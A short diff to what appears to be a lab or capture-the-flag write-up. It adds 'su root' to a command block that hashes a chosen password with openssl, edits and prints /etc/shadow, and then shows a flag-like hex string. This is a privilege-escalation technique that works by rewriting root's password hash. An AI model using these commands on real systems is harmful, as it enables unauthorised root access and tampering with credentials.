@@ -55,6 +55,7 @@ ls -l /etc/shadow
 openssl passwd -6 -salt abc password                                                                                                        
 vim /etc/shadow                                                                                                                             
 cat /etc/shadow
+su root
 ```
 ```commandline
 74fea7cd0556e9c6f22e6f54bc68f5d5
